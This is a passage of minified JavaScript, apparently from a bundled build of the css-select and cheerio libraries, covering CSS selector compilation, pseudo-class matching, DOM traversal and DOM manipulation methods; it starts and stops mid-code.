n=t[a];if(!(n<0))for(let s=a-1;s>=0&&n<t[s];s--){const r=e[s+1];e[s+1]=e[s],e[s]=r,t[s+1]=t[s],t[s]=n}}}function An(e){var t,a;let n=(t=Ln.get(e.type))!==null&&t!==void 0?t:-1;return e.type===S.Attribute?(n=(a=rp.get(e.action))!==null&&a!==void 0?a:4,e.action===U.Equals&&e.name==="id"&&(n=9),e.ignoreCase&&(n>>=1)):e.type===S.Pseudo&&(e.data?e.name==="has"||e.name==="contains"?n=0:Array.isArray(e.data)?(n=Math.min(...e.data.map(s=>Math.min(...s.map(An)))),n<0&&(n=0)):n=2:n=3),n}const op=/[-[\]{}()*+?.,\\^$|#\s]/g;function ja(e){return e.replace(op,"\\$&")}const lp=new Set(["accept","accept-charset","align","alink","axis","bgcolor","charset","checked","clear","codetype","color","compact","declare","defer","dir","direction","disabled","enctype","face","frame","hreflang","http-equiv","lang","language","link","media","method","multiple","nohref","noresize","noshade","nowrap","readonly","rel","rev","rules","scope","scrolling","selected","shape","target","text","type","valign","valuetype","vlink"]);function ue(e,t){return typeof e.ignoreCase=="boolean"?e.ignoreCase:e.ignoreCase==="quirks"?!!t.quirksMode:!t.xmlMode&&lp.has(e.name)}const cp={equals(e,t,a){const{adapter:n}=a,{name:s}=t;let{value:r}=t;return ue(t,a)?(r=r.toLowerCase(),p=>{const o=n.getAttributeValue(p,s);return o!=null&&o.length===r.length&&o.toLowerCase()===r&&e(p)}):p=>n.getAttributeValue(p,s)===r&&e(p)},hyphen(e,t,a){const{adapter:n}=a,{name:s}=t;let{value:r}=t;const p=r.length;return ue(t,a)?(r=r.toLowerCase(),function(l){const c=n.getAttributeValue(l,s);return c!=null&&(c.length===p||c.charAt(p)==="-")&&c.substr(0,p).toLowerCase()===r&&e(l)}):function(l){const c=n.getAttributeValue(l,s);return c!=null&&(c.length===p||c.charAt(p)==="-")&&c.substr(0,p)===r&&e(l)}},element(e,t,a){const{adapter:n}=a,{name:s,value:r}=t;if(/\s/.test(r))return R.falseFunc;const p=new RegExp(`(?:^|\\s)${ja(r)}(?:$|\\s)`,ue(t,a)?"i":"");return function(l){const c=n.getAttributeValue(l,s);return c!=null&&c.length>=r.length&&p.test(c)&&e(l)}},exists(e,{name:t},{adapter:a}){return n=>a.hasAttrib(n,t)&&e(n)},start(e,t,a){const{adapter:n}=a,{name:s}=t;let{value:r}=t;const p=r.length;return p===0?R.falseFunc:ue(t,a)?(r=r.toLowerCase(),o=>{const l=n.getAttributeValue(o,s);return l!=null&&l.length>=p&&l.substr(0,p).toLowerCase()===r&&e(o)}):o=>{var l;return!!(!((l=n.getAttributeValue(o,s))===null||l===void 0)&&l.startsWith(r))&&e(o)}},end(e,t,a){const{adapter:n}=a,{name:s}=t;let{value:r}=t;const p=-r.length;return p===0?R.falseFunc:ue(t,a)?(r=r.toLowerCase(),o=>{var l;return((l=n.getAttributeValue(o,s))===null||l===void 0?void 0:l.substr(p).toLowerCase())===r&&e(o)}):o=>{var l;return!!(!((l=n.getAttributeValue(o,s))===null||l===void 0)&&l.endsWith(r))&&e(o)}},any(e,t,a){const{adapter:n}=a,{name:s,value:r}=t;if(r==="")return R.falseFunc;if(ue(t,a)){const p=new RegExp(ja(r),"i");return function(l){const c=n.getAttributeValue(l,s);return c!=null&&c.length>=r.length&&p.test(c)&&e(l)}}return p=>{var o;return!!(!((o=n.getAttributeValue(p,s))===null||o===void 0)&&o.includes(r))&&e(p)}},not(e,t,a){const{adapter:n}=a,{name:s}=t;let{value:r}=t;return r===""?p=>!!n.getAttributeValue(p,s)&&e(p):ue(t,a)?(r=r.toLowerCase(),p=>{const o=n.getAttributeValue(p,s);return(o==null||o.length!==r.length||o.toLowerCase()!==r)&&e(p)}):p=>n.getAttributeValue(p,s)!==r&&e(p)}},dp=new Set([9,10,12,13,32]),Ia=48,ip=57;function xp(e){if(e=e.trim().toLowerCase(),e==="even")return[2,0];if(e==="odd")return[2,1];let t=0,a=0,n=r(),s=p();if(t<e.length&&e.charAt(t)==="n"&&(t++,a=n*(s??1),o(),t<e.length?(n=r(),o(),s=p()):n=s=0),s===null||t<e.length)throw new Error(`n-th rule couldn't be parsed ('${e}')`);return[a,n*s];function r(){return e.charAt(t)==="-"?(t++,-1):(e.charAt(t)==="+"&&t++,1)}function p(){const l=t;let c=0;for(;t<e.length&&e.charCodeAt(t)>=Ia&&e.charCodeAt(t)<=ip;)c=c*10+(e.charCodeAt(t)-Ia),t++;return t===l?null:c}function o(){for(;t<e.length&&dp.has(e.charCodeAt(t));)t++}}function yp(e){const t=e[0],a=e[1]-1;if(a<0&&t<=0)return R.falseFunc;if(t===-1)return r=>r<=a;if(t===0)return r=>r===a;if(t===1)return a<0?R.trueFunc:r=>r>=a;const n=Math.abs(t),s=(a%n+n)%n;return t>1?r=>r>=a&&r%n===s:r=>r<=a&&r%n===s}function at(e){return yp(xp(e))}function nt(e,t){return a=>{const n=t.getParent(a);return n!=null&&t.isTag(n)&&e(a)}}const qt={contains(e,t,{adapter:a}){return function(s){return e(s)&&a.getText(s).includes(t)}},icontains(e,t,{adapter:a}){const n=t.toLowerCase();return function(r){return e(r)&&a.getText(r).toLowerCase().includes(n)}},"nth-child"(e,t,{adapter:a,equals:n}){const s=at(t);return s===R.falseFunc?R.falseFunc:s===R.trueFunc?nt(e,a):function(p){const o=a.getSiblings(p);let l=0;for(let c=0;c<o.length&&!n(p,o[c]);c++)a.isTag(o[c])&&l++;return s(l)&&e(p)}},"nth-last-child"(e,t,{adapter:a,equals:n}){const s=at(t);return s===R.falseFunc?R.falseFunc:s===R.trueFunc?nt(e,a):function(p){const o=a.getSiblings(p);let l=0;for(let c=o.length-1;c>=0&&!n(p,o[c]);c--)a.isTag(o[c])&&l++;return s(l)&&e(p)}},"nth-of-type"(e,t,{adapter:a,equals:n}){const s=at(t);return s===R.falseFunc?R.falseFunc:s===R.trueFunc?nt(e,a):function(p){const o=a.getSiblings(p);let l=0;for(let c=0;c<o.length;c++){const i=o[c];if(n(p,i))break;a.isTag(i)&&a.getName(i)===a.getName(p)&&l++}return s(l)&&e(p)}},"nth-last-of-type"(e,t,{adapter:a,equals:n}){const s=at(t);return s===R.falseFunc?R.falseFunc:s===R.trueFunc?nt(e,a):function(p){const o=a.getSiblings(p);let l=0;for(let c=o.length-1;c>=0;c--){const i=o[c];if(n(p,i))break;a.isTag(i)&&a.getName(i)===a.getName(p)&&l++}return s(l)&&e(p)}},root(e,t,{adapter:a}){return n=>{const s=a.getParent(n);return(s==null||!a.isTag(s))&&e(n)}},scope(e,t,a,n){const{equals:s}=a;return!n||n.length===0?qt.root(e,t,a):n.length===1?r=>s(n[0],r)&&e(r):r=>n.includes(r)&&e(r)},hover:jt("isHovered"),visited:jt("isVisited"),active:jt("isActive")};function jt(e){return function(a,n,{adapter:s}){const r=s[e];return typeof r!="function"?R.falseFunc:function(o){return r(o)&&a(o)}}}const Va={empty(e,{adapter:t}){return!t.getChildren(e).some(a=>t.isTag(a)||t.getText(a)!=="")},"first-child"(e,{adapter:t,equals:a}){if(t.prevElementSibling)return t.prevElementSibling(e)==null;const n=t.getSiblings(e).find(s=>t.isTag(s));return n!=null&&a(e,n)},"last-child"(e,{adapter:t,equals:a}){const n=t.getSiblings(e);for(let s=n.length-1;s>=0;s--){if(a(e,n[s]))return!0;if(t.isTag(n[s]))break}return!1},"first-of-type"(e,{adapter:t,equals:a}){const n=t.getSiblings(e),s=t.getName(e);for(let r=0;r<n.length;r++){const p=n[r];if(a(e,p))return!0;if(t.isTag(p)&&t.getName(p)===s)break}return!1},"last-of-type"(e,{adapter:t,equals:a}){const n=t.getSiblings(e),s=t.getName(e);for(let r=n.length-1;r>=0;r--){const p=n[r];if(a(e,p))return!0;if(t.isTag(p)&&t.getName(p)===s)break}return!1},"only-of-type"(e,{adapter:t,equals:a}){const n=t.getName(e);return t.getSiblings(e).every(s=>a(e,s)||!t.isTag(s)||t.getName(s)!==n)},"only-child"(e,{adapter:t,equals:a}){return t.getSiblings(e).every(n=>a(e,n)||!t.isTag(n))}};function Ua(e,t,a,n){if(a===null){if(e.length>n)throw new Error(`Pseudo-class :${t} requires an argument`)}else if(e.length===n)throw new Error(`Pseudo-class :${t} doesn't have any arguments`)}const wp={"any-link":":is(a, area, link)[href]",link:":any-link:not(:visited)",disabled:`:is(
        :is(button, input, select, textarea, optgroup, option)[disabled],
        optgroup[disabled] > option,
        fieldset[disabled]:not(fieldset[disabled] legend:first-of-type *)
    )`,enabled:":not(:disabled)",checked:":is(:is(input[type=radio], input[type=checkbox])[checked], option:selected)",required:":is(input, select, textarea)[required]",optional:":is(input, select, textarea):not([required])",selected:"option:is([selected], select:not([multiple]):not(:has(> option[selected])) > :first-of-type)",checkbox:"[type=checkbox]",file:"[type=file]",password:"[type=password]",radio:"[type=radio]",reset:"[type=reset]",image:"[type=image]",submit:"[type=submit]",parent:":not(:empty)",header:":is(h1, h2, h3, h4, h5, h6)",button:":is(button, input[type=button])",input:":is(input, textarea, select, button)",text:"input:is(:not([type!='']), [type=text])"},Dn={};function fp(e,t){return e===R.falseFunc?R.falseFunc:a=>t.isTag(a)&&e(a)}function Hn(e,t){const a=t.getSiblings(e);if(a.length<=1)return[];const n=a.indexOf(e);return n<0||n===a.length-1?[]:a.slice(n+1).filter(t.isTag)}function zt(e){return{xmlMode:!!e.xmlMode,lowerCaseAttributeNames:!!e.lowerCaseAttributeNames,lowerCaseTags:!!e.lowerCaseTags,quirksMode:!!e.quirksMode,cacheResults:!!e.cacheResults,pseudos:e.pseudos,adapter:e.adapter,equals:e.equals}}const It=(e,t,a,n,s)=>{const r=s(t,zt(a),n);return r===R.trueFunc?e:r===R.falseFunc?R.falseFunc:p=>r(p)&&e(p)},Vt={is:It,matches:It,where:It,not(e,t,a,n,s){const r=s(t,zt(a),n);return r===R.falseFunc?e:r===R.trueFunc?R.falseFunc:p=>!r(p)&&e(p)},has(e,t,a,n,s){const{adapter:r}=a,p=zt(a);p.relativeSelector=!0;const o=t.some(i=>i.some(oa))?[Dn]:void 0,l=s(t,p,o);if(l===R.falseFunc)return R.falseFunc;const c=fp(l,r);if(o&&l!==R.trueFunc){const{shouldTestNextSiblings:i=!1}=l;return f=>{if(!e(f))return!1;o[0]=f;const y=r.getChildren(f),u=i?[...y,...Hn(f,r)]:y;return r.existsOne(c,u)}}return i=>e(i)&&r.existsOne(c,r.getChildren(i))}};function hp(e,t,a,n,s){var r;const{name:p,data:o}=t;if(Array.isArray(o)){if(!(p in Vt))throw new Error(`Unknown pseudo-class :${p}(${o})`);return Vt[p](e,o,a,n,s)}const l=(r=a.pseudos)===null||r===void 0?void 0:r[p],c=typeof l=="string"?l:wp[p];if(typeof c=="string"){if(o!=null)throw new Error(`Pseudo ${p} doesn't have any arguments`);const i=bt(c);return Vt.is(e,i,a,n,s)}if(typeof l=="function")return Ua(l,p,o,1),i=>l(i,o)&&e(i);if(p in qt)return qt[p](e,o,a,n);if(p in Va){const i=Va[p];return Ua(i,p,o,2),f=>i(f,a,o)&&e(f)}throw new Error(`Unknown pseudo-class :${p}`)}function Ut(e,t){const a=t.getParent(e);return a&&t.isTag(a)?a:null}function up(e,t,a,n,s){const{adapter:r,equals:p}=a;switch(t.type){case S.PseudoElement:throw new Error("Pseudo-elements are not supported by css-select");case S.ColumnCombinator:throw new Error("Column combinators are not yet supported by css-select");case S.Attribute:{if(t.namespace!=null)throw new Error("Namespaced attributes are not yet supported by css-select");return(!a.xmlMode||a.lowerCaseAttributeNames)&&(t.name=t.name.toLowerCase()),cp[t.action](e,t,a)}case S.Pseudo:return hp(e,t,a,n,s);case S.Tag:{if(t.namespace!=null)throw new Error("Namespaced tag names are not yet supported by css-select");let{name:o}=t;return(!a.xmlMode||a.lowerCaseTags)&&(o=o.toLowerCase()),function(c){return r.getName(c)===o&&e(c)}}case S.Descendant:{if(a.cacheResults===!1||typeof WeakSet>"u")return function(c){let i=c;for(;i=Ut(i,r);)if(e(i))return!0;return!1};const o=new WeakSet;return function(c){let i=c;for(;i=Ut(i,r);)if(!o.has(i)){if(r.isTag(i)&&e(i))return!0;o.add(i)}return!1}}case"_flexibleDescendant":return function(l){let c=l;do if(e(c))return!0;while(c=Ut(c,r));return!1};case S.Parent:return function(l){return r.getChildren(l).some(c=>r.isTag(c)&&e(c))};case S.Child:return function(l){const c=r.getParent(l);return c!=null&&r.isTag(c)&&e(c)};case S.Sibling:return function(l){const c=r.getSiblings(l);for(let i=0;i<c.length;i++){const f=c[i];if(p(l,f))break;if(r.isTag(f)&&e(f))return!0}return!1};case S.Adjacent:return r.prevElementSibling?function(l){const c=r.prevElementSibling(l);return c!=null&&e(c)}:function(l){const c=r.getSiblings(l);let i;for(let f=0;f<c.length;f++){const y=c[f];if(p(l,y))break;r.isTag(y)&&(i=y)}return!!i&&e(i)};case S.Universal:{if(t.namespace!=null&&t.namespace!=="*")throw new Error("Namespaced universal selectors are not yet supported by css-select");return e}}}function jn(e){return e.type===S.Pseudo&&(e.name==="scope"||Array.isArray(e.data)&&e.data.some(t=>t.some(jn)))}const Wp={type:S.Descendant},gp={type:"_flexibleDescendant"},kp={type:S.Pseudo,name:"scope",data:null};function mp(e,{adapter:t},a){const n=!!(a!=null&&a.every(s=>{const r=t.isTag(s)&&t.getParent(s);return s===Dn||r&&t.isTag(r)}));for(const s of e){if(!(s.length>0&&oa(s[0])&&s[0].type!==S.Descendant))if(n&&!s.some(jn))s.unshift(Wp);else continue;s.unshift(kp)}}function In(e,t,a){var n;e.forEach(pp),a=(n=t.context)!==null&&n!==void 0?n:a;const s=Array.isArray(a),r=a&&(Array.isArray(a)?a:[a]);if(t.relativeSelector!==!1)mp(e,t,r);else if(e.some(l=>l.length>0&&oa(l[0])))throw new Error("Relative selectors are not allowed when the `relativeSelector` option is disabled");let p=!1;const o=e.map(l=>{if(l.length>=2){const[c,i]=l;c.type!==S.Pseudo||c.name!=="scope"||(s&&i.type===S.Descendant?l[1]=gp:(i.type===S.Adjacent||i.type===S.Sibling)&&(p=!0))}return Sp(l,t,r)}).reduce(bp,R.falseFunc);return o.shouldTestNextSiblings=p,o}function Sp(e,t,a){var n;return e.reduce((s,r)=>s===R.falseFunc?R.falseFunc:up(s,r,t,a,In),(n=t.rootFunc)!==null&&n!==void 0?n:R.trueFunc)}function bp(e,t){return t===R.falseFunc||e===R.trueFunc?e:e===R.falseFunc||t===R.trueFunc?t:function(n){return e(n)||t(n)}}const Vn=(e,t)=>e===t,Tp={adapter:St,equals:Vn};function vp(e){var t,a,n,s;const r=e??Tp;return(t=r.adapter)!==null&&t!==void 0||(r.adapter=St),(a=r.equals)!==null&&a!==void 0||(r.equals=(s=(n=r.adapter)===null||n===void 0?void 0:n.equals)!==null&&s!==void 0?s:Vn),r}function Cp(e){return function(a,n,s){const r=vp(n);return e(a,r,s)}}const la=Cp(In);function Un(e,t,a=!1){return a&&(e=Pp(e,t)),Array.isArray(e)?t.removeSubsets(e):t.getChildren(e)}function Pp(e,t){const a=Array.isArray(e)?e.slice(0):[e],n=a.length;for(let s=0;s<n;s++){const r=Hn(a[s],t);a.push(...r)}return a}const Rp=new Set(["first","last","eq","gt","nth","lt","even","odd"]);function wt(e){return e.type!=="pseudo"?!1:Rp.has(e.name)?!0:e.name==="not"&&Array.isArray(e.data)?e.data.some(t=>t.some(wt)):!1}function Mp(e,t,a){const n=t!=null?parseInt(t,10):NaN;switch(e){case"first":return 1;case"nth":case"eq":return isFinite(n)?n>=0?n+1:1/0:0;case"lt":return isFinite(n)?n>=0?Math.min(n,a):1/0:0;case"gt":return isFinite(n)?1/0:0;case"odd":return 2*a;case"even":return 2*a-1;case"last":case"not":return 1/0}}function Op(e){for(;e.parent;)e=e.parent;return e}function ca(e){const t=[],a=[];for(const n of e)n.some(wt)?t.push(n):a.push(n);return[a,t]}const _p={type:S.Universal,namespace:null},Ep={type:S.Pseudo,name:"scope",data:null};function Jn(e,t,a={}){return Fn([e],t,a)}function Fn(e,t,a={}){if(typeof t=="function")return e.some(t);const[n,s]=ca(bt(t));return n.length>0&&e.some(la(n,a))||s.some(r=>zn(r,e,a).length>0)}function Np(e,t,a,n){const s=typeof a=="string"?parseInt(a,10):NaN;switch(e){case"first":case"lt":return t;case"last":return t.length>0?[t[t.length-1]]:t;case"nth":case"eq":return isFinite(s)&&Math.abs(s)<t.length?[s<0?t[t.length+s]:t[s]]:[];case"gt":return isFinite(s)?t.slice(s+1):[];case"even":return t.filter((r,p)=>p%2===0);case"odd":return t.filter((r,p)=>p%2===1);case"not":{const r=new Set(qn(a,t,n));return t.filter(p=>!r.has(p))}}}function Bn(e,t,a={}){return qn(bt(e),t,a)}function qn(e,t,a){if(t.length===0)return[];const[n,s]=ca(e);let r;if(n.length){const p=Gt(t,n,a);if(s.length===0)return p;p.length&&(r=new Set(p))}for(let p=0;p<s.length&&(r==null?void 0:r.size)!==t.length;p++){const o=s[p];if((r?t.filter(i=>v(i)&&!r.has(i)):t).length===0)break;const c=zn(o,t,a);if(c.length)if(r)c.forEach(i=>r.add(i));else{if(p===s.length-1)return c;r=new Set(c)}}return typeof r<"u"?r.size===t.length?t:t.filter(p=>r.has(p)):[]}function zn(e,t,a){var n;if(e.some(Ve)){const s=(n=a.root)!==null&&n!==void 0?n:Op(t[0]),r={...a,context:t,relativeSelector:!1};return e.push(Ep),ft(s,e,r,!0,t.length)}return ft(t,e,a,!1,t.length)}function Lp(e,t,a={},n=1/0){if(typeof e=="function")return $n(t,e);const[s,r]=ca(bt(e)),p=r.map(o=>ft(t,o,a,!0,n));return s.length&&p.push($t(t,s,a,n)),p.length===0?[]:p.length===1?p[0]:Le(p.reduce((o,l)=>[...o,...l]))}function ft(e,t,a,n,s){const r=t.findIndex(wt),p=t.slice(0,r),o=t[r],l=t.length-1===r?s:1/0,c=Mp(o.name,o.data,l);if(c===0)return[];const f=(p.length===0&&!Array.isArray(e)?mt(e).filter(v):p.length===0?(Array.isArray(e)?e:[e]).filter(v):n||p.some(Ve)?$t(e,[p],a,c):Gt(e,[p],a)).slice(0,c);let y=Np(o.name,f,o.data,a);if(y.length===0||t.length===r+1)return y;const u=t.slice(r+1),g=u.some(Ve);if(g){if(Ve(u[0])){const{type:b}=u[0];(b===S.Sibling||b===S.Adjacent)&&(y=Un(y,St,!0)),u.unshift(_p)}a={...a,relativeSelector:!1,rootFunc:b=>y.includes(b)}}else a.rootFunc&&a.rootFunc!==yt.trueFunc&&(a={...a,rootFunc:yt.trueFunc});return u.some(wt)?ft(y,u,a,!1,s):g?$t(y,[u],a,s):Gt(y,[u],a)}function $t(e,t,a,n){const s=la(t,a,e);return $n(e,s,n)}function $n(e,t,a=1/0){const n=Un(e,St,t.shouldTestNextSiblings);return na(s=>v(s)&&t(s),n,!0,a)}function Gt(e,t,a){const n=(Array.isArray(e)?e:[e]).filter(v);if(n.length===0)return n;const s=la(t,a);return s===yt.trueFunc?n:n.filter(s)}const Ap=/^\s*[+~]/;function Dp(e){if(!e)return this._make([]);if(typeof e!="string"){const t=Ae(e)?e.toArray():[e],a=this.toArray();return this._make(t.filter(n=>a.some(s=>Vr(s,n))))}return this._findBySelector(e,Number.POSITIVE_INFINITY)}function Hp(e,t){var a;const n=this.toArray(),s=Ap.test(e)?n:this.children().toArray(),r={context:n,root:(a=this._root)===null||a===void 0?void 0:a[0],xmlMode:this.options.xmlMode,lowerCaseTags:this.options.lowerCaseTags,lowerCaseAttributeNames:this.options.lowerCaseAttributeNames,pseudos:this.options.pseudos,quirksMode:this.options.quirksMode};return this._make(Lp(e,s,r,t))}function da(e){return function(t,...a){return function(n){var s;let r=e(t,this);return n&&(r=ya(r,n,this.options.xmlMode,(s=this._root)===null||s===void 0?void 0:s[0])),this._make(this.length>1&&r.length>1?a.reduce((p,o)=>o(p),r):r)}}}const Xe=da((e,t)=>{let a=[];for(let n=0;n<t.length;n++){const s=e(t[n]);s.length>0&&(a=a.concat(s))}return a}),ia=da((e,t)=>{const a=[];for(let n=0;n<t.length;n++){const s=e(t[n]);s!==null&&a.push(s)}return a});function xa(e,...t){let a=null;const n=da((s,r)=>{const p=[];return H(r,o=>{for(let l;(l=s(o))&&!(a!=null&&a(l,p.length));o=l)p.push(l)}),p})(e,...t);return function(s,r){a=typeof s=="string"?o=>Jn(o,s,this.options):s?Ke(s):null;const p=n.call(this,r);return a=null,p}}function De(e){return e.length>1?Array.from(new Set(e)):e}const jp=ia(({parent:e})=>e&&!Ee(e)?e:null,De),Ip=Xe(e=>{const t=[];for(;e.parent&&!Ee(e.parent);)t.push(e.parent),e=e.parent;return t},Le,e=>e.reverse()),Vp=xa(({parent:e})=>e&&!Ee(e)?e:null,Le,e=>e.reverse());function Up(e){var t;const a=[];if(!e)return this._make(a);const n={xmlMode:this.options.xmlMode,root:(t=this._root)===null||t===void 0?void 0:t[0]},s=typeof e=="string"?r=>Jn(r,e,n):Ke(e);return H(this,r=>{for(r&&!Ee(r)&&!v(r)&&(r=r.parent);r&&v(r);){if(s(r,0)){a.includes(r)||a.push(r);break}r=r.parent}}),this._make(a)}const Jp=ia(e=>ta(e)),Fp=Xe(e=>{const t=[];for(;e.next;)e=e.next,v(e)&&t.push(e);return t},De),Bp=xa(e=>ta(e),De),qp=ia(e=>aa(e)),zp=Xe(e=>{const t=[];for(;e.prev;)e=e.prev,v(e)&&t.push(e);return t},De),$p=xa(e=>aa(e),De),Gp=Xe(e=>Sn(e).filter(t=>v(t)&&t!==e),Le),Xp=Xe(e=>mt(e).filter(v),De);function Kp(){const e=this.toArray().reduce((t,a)=>j(a)?t.concat(a.children):t,[]);return this._make(e)}function Yp(e){let t=0;const a=this.length;for(;t<a&&e.call(this[t],t,this[t])!==!1;)++t;return this}function Qp(e){let t=[];for(let a=0;a<this.length;a++){const n=this[a],s=e.call(n,a,n);s!=null&&(t=t.concat(s))}return this._make(t)}function Ke(e){return typeof e=="function"?(t,a)=>e.call(t,a,t):Ae(e)?t=>Array.prototype.includes.call(e,t):function(t){return e===t}}function Zp(e){var t;return this._make(ya(this.toArray(),e,this.options.xmlMode,(t=this._root)===null||t===void 0?void 0:t[0]))}function ya(e,t,a,n){return typeof t=="string"?Bn(t,e,{xmlMode:a,root:n}):e.filter(Ke(t))}function eo(e){const t=this.toArray();return typeof e=="string"?Fn(t.filter(v),e,this.options):e?t.some(Ke(e)):!1}function to(e){let t=this.toArray();if(typeof e=="string"){const a=new Set(Bn(e,t,this.options));t=t.filter(n=>!a.has(n))}else{const a=Ke(e);t=t.filter((n,s)=>!a(n,s))}return this._make(t)}function ao(e){return this.filter(typeof e=="string"?`:has(${e})`:(t,a)=>this._make(a).find(e).length>0)}function no(){return this.length>1?this._make(this[0]):this}function so(){return this.length>0?this._make(this[this.length-1]):this}function ro(e){var t;return e=+e,e===0&&this.length<=1?this:(e<0&&(e=this.length+e),this._make((t=this[e])!==null&&t!==void 0?t:[]))}function po(e){return e==null?this.toArray():this[e<0?this.length+e:e]}function oo(){return Array.prototype.slice.call(this)}function lo(e){let t,a;return e==null?(t=this.parent().children(),a=this[0]):typeof e=="string"?(t=this._make(e),a=this[0]):(t=this,a=Ae(e)?e[0]:e),Array.prototype.indexOf.call(t,a)}function co(e,t){return this._make(Array.prototype.slice.call(this,e,t))}function io(){var e;return(e=this.prevObject)!==null&&e!==void 0?e:this._make([])}function xo(e,t){const a=this._make(e,t),n=Le([...this.get(),...a.get()]);return this._make(n)}function yo(e){return this.prevObject?this.add(e?this.prevObject.filter(e):this.prevObject):this}const wo=Object.freeze(Object.defineProperty({__proto__:null,_findBySelector:Hp,add:xo,addBack:yo,children:Xp,closest:Up,contents:Kp,each:Yp,end:io,eq:ro,filter:Zp,filterArray:ya,find:Dp,first:no,get:po,has:ao,index:lo,is:eo,last:so,map:Qp,next:Jp,nextAll:Fp,nextUntil:Bp,not:to,parent:jp,parents:Ip,parentsUntil:Vp,prev:qp,prevAll:zp,prevUntil:$p,siblings:Gp,slice:co,toArray:oo},Symbol.toStringTag,{value:"Module"}));function Oe(e,t){const a=Array.isArray(e)?e:[e];t?t.children=a:t=null;for(let n=0;n<a.length;n++){const s=a[n];s.parent&&s.parent.children!==a&&Se(s),t?(s.prev=a[n-1]||null,s.next=a[n+1]||null):s.prev=s.next=null,s.parent=t}return t}function fo(e,t){if(e==null)return[];if(typeof e=="string")return this._parse(e,this.options,!1,null).children.slice(0);if("length"in e){if(e.length===1)return this._makeDomArray(e[0],t);const a=[];for(let n=0;n<e.length;n++){const s=e[n];if(typeof s=="object"){if(s==null)continue;if(!("length"in s)){a.push(t?Fe(s,!0):s);continue}}a.push(...this._makeDomArray(s,t))}return a}return[t?Fe(e,!0):e]}function Gn(e){return function(...t){const a=this.length-1;return H(this,(n,s)=>{if(!j(n))return;const r=typeof t[0]=="function"?t[0].call(n,s,this._render(n.children)):t,p=this._makeDomArray(r,s<a);e(p,n.children,n)})}}function ye(e,t,a,n,s){var r,p;const o=[t,a,...n],l=t===0?null:e[t-1],c=t+a>=e.length?null:e[t+a];for(let i=0;i<n.length;++i){const f=n[i],y=f.parent;if(y){const g=y.children.indexOf(f);g>-1&&(y.children.splice(g,1),s===y&&t>g&&o[0]--)}f.parent=s,f.prev&&(f.prev.next=(r=f.next)!==null&&r!==void 0?r:null),f.next&&(f.next.prev=(p=f.prev)!==null&&p!==void 0?p:null),f.prev=i===0?l:n[i-1],f.next=i===n.length-1?c:n[i+1]}return l&&(l.next=n[0]),c&&(c.prev=n[n.length-1]),e.splice(...o)}function ho(e){return(Ae(e)?e:this._make(e)).append(this),this}function uo(e){return(Ae(e)?e:this._make(e)).prepend(this),this}const Wo=Gn((e,t,a)=>{ye(t,t.length,0,e,a)}),go=Gn((e,t,a)=>{ye(t,0,0,e,a)});function Xn(e){return function(t){const a=this.length-1,n=this.parents().last();for(let s=0;s<this.length;s++){const r=this[s],p=typeof t=="function"?t.call(r,s,r):typeof t=="string"&&!Fr(t)?n.find(t).clone():t,[o]=this._makeDomArray(p,s<a);if(!o||!j(o))continue;let l=o,c=0;for(;c<l.children.length;){const i=l.children[c];v(i)?(l=i,c=0):c++}e(r,l,[o])}return this}}const ko=Xn((e,t,a)=>{const{parent:n}=e;if(!n)return;const s=n.children,r=s.indexOf(e);Oe([e],t),ye(s,r,0,a,n)}),mo=Xn((e,t,a)=>{j(e)&&(Oe(e.children,t),Oe(a,e))});function So(e){return this.parent(e).not("body").each((t,a)=>{this._make(a).replaceWith(a.children)}),this}function bo(e){const t=this[0];if(t){const a=this._make(typeof e=="function"?e.call(t,0,t):e).insertBefore(t);let n;for(let r=0;r<a.length;r++)a[r].type==="tag"&&(n=a[r]);let s=0;for(;n&&s<n.children.length;){const r=n.children[s];r.type==="tag"?(n=r,s=0):s++}n&&this._make(n).append(this)}return this}function To(...e){const t=this.length-1;return H(this,(a,n)=>{if(!j(a)||!a.parent)return;const s=a.parent.children,r=s.indexOf(a);if(r<0)return;const p=typeof e[0]=="function"?e[0].call(a,n,this._render(a.children)):e,o=this._makeDomArray(p,n<t);ye(s,r+1,0,o,a.parent)})}function vo(e){typeof e=="string"&&(e=this._make(e)),this.remove();const t=[];for(const a of this._makeDomArray(e)){const n=this.clone().toArray(),{parent:s}=a;if(!s)continue;const r=s.children,p=r.indexOf(a);p<0||(ye(r,p+1,0,n,s),t.push(...n))}return this._make(t)}function Co(...e){const t=this.length-1;return H(this,(a,n)=>{if(!j(a)||!a.parent)return;const s=a.parent.children,r=s.indexOf(a);if(r<0)return;const p=typeof e[0]=="function"?e[0].call(a,n,this._render(a.children)):e,o=this._makeDomArray(p,n<t);ye(s,r,0,o,a.parent)})}function Po(e){const t=this._make(e);this.remove();const a=[];return H(t,n=>{const s=this.clone().toArray(),{parent:r}=n;if(!r)return;const p=r.children,o=p.indexOf(n);o<0||(ye(p,o,0,s,r),a.push(...s))}),this._make(a)}function Ro(e){const t=e?this.filter(e):this;return H(t,a=>{Se(a),a.prev=a.next=a.parent=null}),this}function Mo(e){return H(this,(t,a)=>{const{parent:n}=t;if(!n)return;const s=n.children,r=typeof e=="function"?e.call(t,a,t):e,p=this._makeDomArray(r);Oe(p,null);const o=s.indexOf(t);ye(s,o,1,p,n),p.includes(t)||(t.parent=t.prev=t.next=null)})}function Oo(){return H(this,e=>{if(j(e)){for(const t of e.children)t.next=t.prev=t.parent=null;e.children.length=0}})}function _o(e){if(e===void 0){const t=this[0];return!t||!j(t)?null:this._render(t.children)}return H(this,t=>{if(!j(t))return;for(const n of t.children)n.next=n.prev=n.parent=null;const a=Ae(e)?e.toArray():this._parse(`${e}`,this.options,!1,t).children;Oe(a,t)})}function Eo(){return this._render(this)}function No(e){return e===void 0?dt(this):typeof e=="function"?H(this,(t,a)=>this._make(t).text(e.call(t,a,dt([t])))):H(this,t=>{if(!j(t))return;for(const n of t.children)n.next=n.prev=n.parent=null;const a=new hn(`${e}`);Oe(a,t)})}function Lo(){const e=Array.prototype.map.call(this.get(),a=>Fe(a,!0)),t=new un(e);for(const a of e)a.parent=t;return this._make(e)}const Ao=Object.freeze(Object.defineProperty({__proto__:null,_makeDomArray:fo,after:To,append:Wo,appendTo:ho,before:Co,clone:Lo,empty:Oo,html:_o,insertAfter:vo,insertBefore:Po,prepend:go,prependTo:uo,remove:Ro,replaceWith:Mo,text:No,toString:Eo,unwrap:So,wrap:ko,wrapAll:bo,wrapInner:mo},Symbol.toStringTag,{value:"Module"}));function Do(e,t){if(e!=null&&t!=null||typeof e=="object"&&!Array.isArray(e))return H(this,(a,n)=>{v(a)&&Kn(a,e,t,n)});if(this.length!==0)return Yn(this[0],e)}function Kn(e,t,a,n){if(typeof t=="string"){const s=Yn(e),r=typeof a=="function"?a.call(e,n,s[t]):a;r===""?delete 